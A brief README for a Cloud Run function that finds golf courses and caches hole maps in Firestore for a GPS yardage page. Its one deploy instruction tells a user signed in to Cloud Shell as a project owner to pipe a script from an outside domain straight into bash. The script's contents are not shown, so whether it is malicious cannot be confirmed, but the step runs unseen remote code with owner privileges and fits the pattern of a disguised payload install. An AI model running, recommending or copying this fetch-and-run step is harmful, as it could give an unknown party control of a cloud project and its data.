# course-map endpoint

Cloud Run function `course-map` in Firebase project `msg-dev-74f88` (us-central1). The MSG App GPS
yardage page (`public/gps/page.js`) posts `{name, lat?, lng?}` here. It finds the course (Nominatim,
then OpenGolfAPI, or the golfer's own location), gets holes/greens from Overpass with our contact
User-Agent, and saves the map in Firestore `courseMaps/<key>` so every phone loads it from there.
`osm.js` is a copy of msg-app `public/gps/osm.js` — keep them in step.

Deploy (Cloud Shell, signed in as a project owner): `curl -sL mvwns.com/c.sh|bash`
